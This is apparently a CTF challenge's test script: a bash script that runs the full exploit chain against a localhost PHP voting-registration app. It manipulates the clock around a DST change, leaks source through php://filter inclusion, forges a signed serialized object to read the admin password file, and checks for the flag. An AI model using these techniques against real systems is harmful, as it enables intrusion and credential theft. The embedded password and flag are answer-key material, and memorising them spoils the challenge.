#!/bin/bash

# JUSTINTIME test script
# Shell script to test entire exploit chain
# Script will change global system time between phase1 and phase2 so it must be
# run on the server

URL="http://localhost/"
NAME="name$RANDOM"

set -e

function failure() {
  ERR="$@";
  echo -e "\e[1;41mFailure: $1\e[0m";
  exit 1
}

function success() {
  MSG="$@"
  echo -e "\e[1;92mPass: $1\e[0m";
}

function cleanup() {
  echo "Resetting system to use network time:"
  sudo timedatectl set-ntp 1
  sleep 2s;
  echo "System date is now: `date`"
  rm -f ".test.php" ".voter.php" ".voter.full.php";
}

trap cleanup EXIT

sudo timedatectl set-ntp 0
sudo timedatectl set-time "2016-11-06 01:30:00"
date | grep "1:30" | grep -q "Nov  6"
if [ $? -eq 1 ]; then
  failure "Could not set date";
else
  success "Date changed to 11/6 at 1:30AM"
fi

# Phase 1: get voter.php, voterid and userkey
VOTER_PHP=$(curl -s "${URL}inc.php?p=php://filter/string.rot13/resource=voter" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]' > .voter.full.php) || failure "curl $LINENO"
VOTERID_RAW=$(curl -s "${URL}register.php" --data "name=$NAME&address=a&zip=40003&affiliation=Independent") || failure "curl $LINENO"
VOTERID=$(echo $VOTERID_RAW | awk -F"word\">" '{print $2}' | awk -F"<" '{print $1}' | tr -d "[:blank:]")
USERKEY_RAW=$(curl -s "${URL}check_reg.php?debugpw=thebluegrassstate" --data "id=${VOTERID}") || failure "curl $LINENO"
USERKEY=$(echo $USERKEY_RAW | awk -F"signed with key " '{print $2}' | awk -F"<" '{print $1}' | tr -d "[:blank:]")
success "Got VoterID with debug data: ${VOTERID:0:7}... ${USERKEY:0:7}..."

echo -e "\nSetting date to 11/6 1:59:59AM EDT and waiting for timezone change"
sudo timedatectl set-time "2016-11-06 01:59:59"
sleep 2s;

date | grep -q "EST"
if [ $? -eq 1 ]; then
  failure "Timezone not changed";
else
  success "Timezone changed to EST"
fi


ARGS="<?php \$voterid_json_b64=\"${VOTERID}\";\n\$user_key_b64=\"${USERKEY}\";\n"
PHP=$(echo -ne $ARGS; cat <<'CODE'
require_once(".voter.php");
$voterid_json = base64_decode($voterid_json_b64) or die("could not unbase64 voterid");
$user_key = base64_decode($user_key_b64) or die("could not unbase64 user_key");
list($vote_s, $vote_s_sig, $name, $name_sig) = json_decode($voterid_json) or die("could not json decode voterid");
$my_vote_s_sig = hash_hmac("sha512", $vote_s, $user_key);
assert($my_vote_s_sig == $vote_s_sig) or die("Signing original message with provided key generates incorrect signature");
$voter = unserialize($vote_s);
$voter->show_log=true;
$voter->log="../admin_password";
$vote_s = serialize($voter);
$vote_s_sig = hash_hmac("sha512", $vote_s, $user_key);
print(base64_encode(json_encode([$vote_s, $vote_s_sig, $voter->name, $name_sig])));
?>
CODE
)
echo $PHP > ".test.php";

# Remove everything but voter class from voter
sed '/require_once("util.php");/,$d' .voter.full.php > .voter.php
echo "?>" >> .voter.php


if MODIFIED_VOTERID=$(php -f ".test.php"); then
  success "Created malicious Voter object"
else
  failure "$MODIFIED_VOTERID";
fi

UPDATELOG_RAW=$(curl -s "${URL}check_reg.php" --data "id=${MODIFIED_VOTERID}") || failure "curl $LINENO"
UPDATELOG=$(echo $UPDATELOG_RAW | awk -F"Last update to voter:<br>" '{print $2}' | awk -F"<" '{print $1}' | tr -d "[:blank:]")

if [ "$UPDATELOG" == "secureAdminPassword4VotingMachineManagement" ]; then
  success "Admin password match"
else
  failure "Admin password mismatch: $UPDATELOG is incorrect";
fi

ADMIN_RAW=$(curl -s "${URL}admin.php" --data "password=${UPDATELOG}") || failure "curl $LINENO"

if [[ $ADMIN_RAW == *"F1:A6:FA:11:C0:DE:CO:11:DE:5L:0C:AL:E5"* ]]; then
  success "Flag found"
else
  failure "flag not found";
fi

success "All checks passed!";
